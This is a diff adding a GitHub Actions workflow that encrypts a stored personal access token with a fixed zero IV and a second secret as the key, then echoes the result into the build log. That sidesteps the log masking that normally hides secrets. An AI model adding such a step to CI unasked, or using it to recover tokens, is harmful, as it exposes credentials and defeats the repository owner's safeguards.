@@ -1,0 +1,11 @@
+name: Encrypt PAT
+
+on:
+  workflow_dispatch:
+
+jobs:
+  encrypt-pat:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Encrypt and echo PAT
+        run: echo "Encrypted PAT is $(echo -n '${{ secrets.__RAT__ }}' | openssl enc -aes-256-cbc -a -iv 00000000000000000000000000000000 -K '${{ secrets.ZKEY }}')"
